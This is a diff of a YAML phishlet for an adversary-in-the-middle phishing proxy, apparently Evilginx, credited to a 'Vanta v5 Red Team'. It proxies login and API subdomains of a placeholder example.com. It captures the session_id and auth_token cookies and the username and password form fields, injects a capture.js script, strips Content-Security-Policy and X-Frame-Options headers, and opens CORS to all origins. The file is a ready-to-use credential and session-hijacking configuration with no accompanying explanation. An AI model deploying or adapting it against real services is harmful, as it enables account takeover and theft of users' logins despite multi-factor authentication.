@@ -1,20 +1,36 @@
-min_ver: '3.0.0'
+name: "Example-Service"
+author: "Vanta v5 Red Team"
+min_ver: "5.0.0"
 proxy_hosts:
-  - {phish_sub: 'academy', orig_sub: 'academy', domain: 'breakdev.org', session: true, is_landing: true, auto_filter: true}
-sub_filters:
-  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+  - subdomain: "login"
+    target: "login.example.com"
+  - subdomain: "api"
+    target: "api.example.com"
+auth_urls: 
+  - "/login"
+  - "/auth"
+landing_path: ["/login"]
 auth_tokens:
-  - domain: '.academy.breakdev.org'
-    keys: ['cookie_name']
+  - {type: "cookie", name: "session_id"}
+  - {type: "cookie", name: "auth_token"}
 credentials:
-  username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'academy.breakdev.org'
-  path: '/evilginx-mastery'
+  - {type: "post_param", name: "username", regex: null}
+  - {type: "post_param", name: "password", regex: null}
+injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|/gtm/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*=\"login\"]", action_to: "/api/auth"}
+bridges:
+  - {prefix: "/_api/", target_host: "api.example.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
+  headers: ["*"]
